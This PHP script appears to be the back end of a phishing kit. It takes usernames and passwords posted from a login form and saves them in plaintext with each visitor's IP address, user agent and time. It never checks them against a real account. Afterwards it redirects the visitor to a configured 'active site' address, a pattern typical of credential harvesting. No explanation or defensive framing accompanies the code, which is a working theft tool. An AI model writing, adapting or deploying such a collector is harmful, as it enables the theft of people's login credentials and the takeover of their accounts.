<?php
include 'config.php';

if(sizeof($_POST['submit']))
{	
	// Instantiate the dataabse
	$db = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
	
	// Check for connection errors
	if (mysqli_connect_errno()) {
	    printf("Connect failed: %s\n", mysqli_connect_error());
	    exit();
	}
	
	// Retrieve variables from the form
	$username = $_POST['username'];
	$password = $_POST['password'];
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$ip = $_SERVER['REMOTE_ADDR'];
	$time = time();
	
	// Perform validation, sanitization, and run
	if(validated($username) && validated($password))
	{
		$check = check_user($db, $username, $password);
		
		if($check === true)
		{
			redirect();
			exit;
		}
		
		// Prepare the query
		$query = 'INSERT INTO ' . DB_EXT . '_users (user_name, user_password, user_time, user_agent, user_ip) VALUES (?, ?, ?, ?, ?)';
		$stmt = $db->prepare($query);
		
		// Execute the query
		if($stmt)
		{
			$stmt->bind_param('ssdss', $username, $password, $time, $user_agent, $ip);
			$stmt->execute();
			$stmt->close();
		}
		
		$query = 'SELECT site_redirect FROM ' . DB_EXT . '_sites WHERE site_active=1 LIMIT 1';
		$result = $db->query($query);
		
		$row = $result->fetch_assoc();
		$redirect = $row['site_redirect'];
		$result->free_result();
		
		if($redirect && $redirect != '')
		{
			redirect($redirect);
		}
		else
		{
			redirect();
		}
	}
	else
	{
		redirect();
	}
	
	// Close the database connection
	$db->close();
}
else
{
	redirect();
}

function check_user($db, $username, $password)
{
	$query = 'SELECT * FROM ' . DB_EXT . '_users WHERE user_name = ? AND user_password = ? LIMIT 1';
	$stmt = $db->prepare($query);
	
	if($stmt)
	{
		$stmt->bind_param('ss', $username, $password);
		$stmt->execute();
		$result = $stmt->fetch();
		
		return ($result) ? true : false;
		
		$result->free_result();
		$stmt->close();
	}
}

// Validate and sanitize the input
function validated(&$data)
{
	$data = filter_var($data, FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_LOW);
	return (!sizeof($data) || $data == '' || strlen($data) < 2 || strlen($data) > 45) ? false : true;
}

function redirect($url='index.php')
{
	header("Location: $url");
}
?>